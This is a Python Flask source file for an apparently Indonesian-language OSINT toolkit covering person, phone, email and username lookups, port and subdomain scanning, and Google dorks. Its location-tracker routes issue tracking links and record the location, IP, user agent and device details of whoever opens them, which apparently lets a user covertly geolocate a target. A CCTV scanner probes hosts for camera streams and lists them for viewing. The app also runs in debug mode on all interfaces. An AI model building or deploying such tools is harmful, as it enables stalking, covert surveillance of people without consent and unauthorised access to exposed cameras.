import json
import os
import uuid
from datetime import datetime
from urllib.parse import quote

from flask import Flask, render_template, request, jsonify, redirect, url_for, abort

from tools import phone_tool, ip_tool, username_tool, email_tool
from tools import domain_tool, dns_tool, portscan_tool, tech_tool, dorks_tool, deep_username
from tools import subdomain_tool, search_tool
from tools import cctv_tool, flight_tool

app = Flask(__name__)

DATA_DIR = os.path.join(os.path.dirname(__file__), 'data')
TRACKING_FILE = os.path.join(DATA_DIR, 'tracking.json')


def load_tracking():
    if not os.path.exists(TRACKING_FILE):
        return {}
    with open(TRACKING_FILE) as f:
        return json.load(f)


def save_tracking(data):
    os.makedirs(DATA_DIR, exist_ok=True)
    with open(TRACKING_FILE, 'w') as f:
        json.dump(data, f, indent=2)


@app.route('/')
def index():
    return render_template('index.html')


# ── PHONE ──
@app.route('/phone', methods=['GET', 'POST'])
def phone():
    result = error = None
    if request.method == 'POST':
        number = request.form.get('number', '').strip()
        if not number:
            error = 'Masukkan nomor telepon'
        else:
            try:
                result = phone_tool.track(number)
            except Exception as e:
                error = f'Gagal memproses nomor: {e}'
    return render_template('phone.html', result=result, error=error)


# ── IP ──
@app.route('/ip', methods=['GET', 'POST'])
def ip_track():
    result = error = None
    if request.method == 'POST':
        ip = request.form.get('ip', '').strip()
        if not ip:
            error = 'Masukkan alamat IP'
        else:
            try:
                result = ip_tool.track(ip)
            except Exception as e:
                error = f'Gagal: {e}'
    return render_template('ip.html', result=result, error=error)


@app.route('/api/myip')
def my_ip():
    try:
        return jsonify({'ip': ip_tool.my_ip()})
    except Exception as e:
        return jsonify({'ip': f'Error: {e}'})


# ── USERNAME ──
@app.route('/username', methods=['GET', 'POST'])
def username():
    results = error = None
    if request.method == 'POST':
        u = request.form.get('username', '').strip()
        if not u:
            error = 'Masukkan username'
        else:
            try:
                results = username_tool.search(u)
            except Exception as e:
                error = f'Gagal: {e}'
    return render_template('username.html', results=results, error=error)


# ── DEEP USERNAME ──
@app.route('/username-deep', methods=['GET', 'POST'])
def username_deep():
    data = error = None
    username_val = ''
    if request.method == 'POST':
        username_val = request.form.get('username', '').strip()
        if not username_val:
            error = 'Masukkan username'
        else:
            try:
                sherlock_data = deep_username.sherlock_search(username_val, timeout=30)
                ig_data = deep_username.instagram_analysis(username_val)

                for entry in sherlock_data.get('found', []):
                    url = entry.get('url', '')
                    if url:
                        entry['preview'] = deep_username.profile_preview(url)

                data = {
                    'sherlock': sherlock_data,
                    'instagram': ig_data,
                }
            except Exception as e:
                error = f'Gagal: {e}'
    return render_template('username_deep.html', data=data, error=error, username=username_val)


# ── EMAIL ──
@app.route('/email', methods=['GET', 'POST'])
def email():
    rep = grav = error = None
    if request.method == 'POST':
        addr = request.form.get('email', '').strip()
        if not addr:
            error = 'Masukkan alamat email'
        else:
            try:
                rep = email_tool.emailrep(addr)
            except Exception as e:
                error = str(e)
            grav = email_tool.gravatar(addr)
    return render_template('email.html', emailrep=rep, gravatar=grav, error=error)


# ── DOMAIN ──
@app.route('/domain', methods=['GET', 'POST'])
def domain():
    result = error = None
    if request.method == 'POST':
        d = request.form.get('domain', '').strip()
        if not d:
            error = 'Masukkan domain'
        else:
            try:
                result = domain_tool.lookup(d)
            except Exception as e:
                error = str(e)
    return render_template('domain.html', result=result, error=error)


# ── DNS ──
@app.route('/dns', methods=['GET', 'POST'])
def dns():
    results = error = None
    domain_val = ''
    if request.method == 'POST':
        domain_val = request.form.get('domain', '').strip()
        if not domain_val:
            error = 'Masukkan domain'
        else:
            try:
                results = dns_tool.resolve_all(domain_val)
            except Exception as e:
                error = str(e)
    return render_template('dns.html', results=results, error=error, domain=domain_val)


# ── PORT SCAN ──
@app.route('/portscan', methods=['GET', 'POST'])
def portscan():
    results = error = None
    target = ''
    if request.method == 'POST':
        target = request.form.get('target', '').strip()
        if not target:
            error = 'Masukkan host target'
        else:
            try:
                results = portscan_tool.scan(target)
            except Exception as e:
                error = str(e)
    return render_template('portscan.html', results=results, error=error, target=target)


# ── TECH STACK ──
@app.route('/tech', methods=['GET', 'POST'])
def tech():
    results = error = None
    target_url = ''
    if request.method == 'POST':
        target_url = request.form.get('url', '').strip()
        if not target_url:
            error = 'Masukkan URL'
        else:
            try:
                results = tech_tool.detect(target_url)
            except Exception as e:
                error = str(e)
    return render_template('tech.html', results=results, error=error, target_url=target_url)


# ── SUBDOMAIN ENUMERATION ──
@app.route('/subdomain', methods=['GET', 'POST'])
def subdomain():
    data = error = None
    domain_val = ''
    if request.method == 'POST':
        domain_val = request.form.get('domain', '').strip()
        if not domain_val:
            error = 'Masukkan domain'
        else:
            try:
                data = subdomain_tool.enumerate(domain_val)
            except Exception as e:
                error = str(e)
    return render_template('subdomain.html', data=data, error=error, domain=domain_val)


# ── GOOGLE DORKS ──
@app.route('/dorks', methods=['GET', 'POST'])
def dorks():
    dork_results = error = None
    clean_target = ''
    if request.method == 'POST':
        t = request.form.get('target', '').strip()
        if not t:
            error = 'Masukkan target domain'
        else:
            try:
                dork_results, clean_target = dorks_tool.generate(t)
            except Exception as e:
                error = str(e)
    return render_template('dorks.html', dorks=dork_results, error=error, target=clean_target)


# ── SEARCH PERSON ──
@app.route('/search-person', methods=['GET', 'POST'])
def search_person():
    results = error = None
    name_val = ''
    selected_engines = []
    search_results = None
    if request.method == 'POST':
        name_val = request.form.get('name', '').strip()
        selected_engines = request.form.getlist('engines')
        if not name_val:
            error = 'Masukkan nama yang ingin dicari'
        elif not selected_engines:
            error = 'Pilih minimal satu search engine'
        else:
            try:
                results = search_tool.generate_links(name_val, selected_engines)
                search_results = search_tool.fetch_results(name_val)
            except Exception as e:
                error = str(e)
    return render_template('search_person.html',
                           results=results, error=error, name=name_val,
                           search_engines=search_tool.SEARCH_ENGINES,
                           selected_engines=selected_engines,
                           search_results=search_results)


# ── LOCATION TRACKER ──
@app.route('/location-tracker', methods=['GET', 'POST'])
def location_tracker():
    if request.method == 'POST':
        label = request.form.get('label', '').strip() or 'Tanpa Label'
        tracking_id = uuid.uuid4().hex[:8]
        data = load_tracking()
        data[tracking_id] = {
            'label': label,
            'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'status': 'pending',
            'location': None,
        }
        save_tracking(data)
        return redirect(url_for('location_tracker_results', tracking_id=tracking_id))

    data = load_tracking()
    sorted_tracks = sorted(data.items(), key=lambda x: x[1]['created_at'], reverse=True)
    return render_template('location_tracker.html', tracks=sorted_tracks,
                           base_url=request.host_url.rstrip('/'))


@app.route('/track/<tracking_id>')
def track_page(tracking_id):
    data = load_tracking()
    if tracking_id not in data:
        abort(404)
    return render_template('track_page.html', tracking_id=tracking_id)


@app.route('/api/location/<tracking_id>', methods=['POST'])
def receive_location(tracking_id):
    data = load_tracking()
    if tracking_id not in data:
        return jsonify({'error': 'not found'}), 404
    body = request.get_json()
    data[tracking_id]['status'] = 'success'
    data[tracking_id]['location'] = {
        'lat': body.get('lat'),
        'lng': body.get('lng'),
        'accuracy': body.get('accuracy'),
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'ip': request.remote_addr,
        'user_agent': request.headers.get('User-Agent', ''),
    }
    if 'device_info' in body:
        data[tracking_id]['device_info'] = body['device_info']
    save_tracking(data)
    return jsonify({'ok': True})


@app.route('/location-tracker/<tracking_id>/results')
def location_tracker_results(tracking_id):
    data = load_tracking()
    if tracking_id not in data:
        abort(404)
    base_url = request.host_url.rstrip('/')
    encoded_url = quote(f'{base_url}/track/{tracking_id}')
    return render_template('location_tracker_results.html',
                           track=data[tracking_id], tracking_id=tracking_id,
                           base_url=base_url, encoded_url=encoded_url)


# ── CCTV FINDER ──
@app.route('/cctv')
def cctv():
    cameras = cctv_tool.load_cameras()
    cities = cctv_tool.get_cities(cameras)
    return render_template('cctv.html', cameras=cameras, cities=cities)


@app.route('/cctv/<cam_id>')
def cctv_view(cam_id):
    cam = cctv_tool.get_camera(cam_id)
    if not cam:
        abort(404)
    return render_template('cctv_view.html', cam=cam)


@app.route('/cctv/scan', methods=['GET', 'POST'])
def cctv_scan():
    scan_results = None
    target = ''
    error = None
    if request.method == 'POST':
        target = request.form.get('target', '').strip()
        if not target:
            error = 'Masukkan IP atau domain'
        else:
            try:
                scan_results = cctv_tool.scan(target)
            except Exception as e:
                error = str(e)
    return render_template('cctv_scan.html', scan_results=scan_results,
                           target=target, error=error)


@app.route('/cctv/add-from-scan', methods=['POST'])
def cctv_add_from_scan():
    url = request.form.get('url', '').strip()
    name = request.form.get('name', '').strip()
    target = request.form.get('target', '').strip()
    if url:
        import uuid
        cam_data = {
            'id': 'scanned_' + uuid.uuid4().hex[:8],
            'name': name or url,
            'city': target,
            'province': '-',
            'source': 'Scanner',
            'type': 'snapshot' if '/snapshot' in url else 'hls',
            'url': url,
            'lat': None,
            'lng': None,
            'status': 'active',
        }
        cctv_tool.save_camera(cam_data)
    return redirect(url_for('cctv'))


@app.route('/cctv/sync')
def cctv_sync():
    try:
        added, updated, total, errors = cctv_tool.sync_from_cctv_indonesia()
        return jsonify({
            'success': True,
            'added': added,
            'updated': updated,
            'total': total,
            'errors': errors,
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


# ── FLIGHT RADAR ──
@app.route('/flight-radar')
def flight_radar():
    return render_template('flight_radar.html')


@app.route('/api/flights')
def api_flights():
    lamin = request.args.get('lamin', type=float)
    lomin = request.args.get('lomin', type=float)
    lamax = request.args.get('lamax', type=float)
    lomax = request.args.get('lomax', type=float)
    try:
        if all(v is not None for v in [lamin, lomin, lamax, lomax]):
            flights = flight_tool.get_flights_in_bounds(lamin, lomin, lamax, lomax)
        else:
            flights = flight_tool.get_flights()
        stats = flight_tool.get_stats(flights)
        return jsonify({'success': True, 'flights': flights, 'stats': stats})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
